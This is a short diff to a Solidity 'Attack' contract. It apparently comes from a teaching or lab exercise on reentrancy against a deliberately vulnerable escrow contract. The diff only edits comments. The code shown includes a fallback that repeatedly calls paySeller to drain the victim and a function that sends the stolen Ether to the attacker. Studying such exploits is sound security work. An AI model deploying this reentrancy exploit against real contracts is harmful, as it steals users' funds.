@@ -39,7 +39,7 @@ contract Attack {
         escrowClient1Vuln = Escrow_client_1_vuln(vulnContractAddress);
     }
 
-    // Fallback is called when EtherStore sends Ether to this contract.
+    // Fallback is called when Escrow_client_1_vuln sends Ether to this contract.
     fallback() external payable {
         if (address(escrowClient1Vuln).balance >= 1 ether) {
             escrowClient1Vuln.paySeller();
@@ -56,7 +56,8 @@ contract Attack {
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
-
+    
+    // Attacker uses this function to transfer stolen Ether to their personal account to complete the attack
     function tranferStolenMoney() external {
         payable(msg.sender).transfer(address(this).balance);
     }
